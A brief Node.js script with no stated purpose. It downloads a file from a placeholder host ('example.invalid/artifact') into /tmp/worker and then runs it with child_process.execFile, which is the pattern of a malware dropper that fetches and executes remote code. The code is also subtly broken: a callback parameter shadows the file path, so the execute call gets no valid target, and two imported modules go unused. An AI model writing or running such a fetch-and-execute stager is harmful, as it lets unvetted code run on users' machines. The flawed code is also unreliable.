const fs = require('fs');
const https = require('https');
const child_process = require('child_process');
const os = require('os');
const path = require('path');
const target = '/tmp/worker';
const file = fs.createWriteStream(target);
https.get('https://example.invalid/artifact', (res) => {
  res.pipe(file);
  file.on('finish', (target) => {
    file.close();
    child_process.execFile(target, []);
  });
});
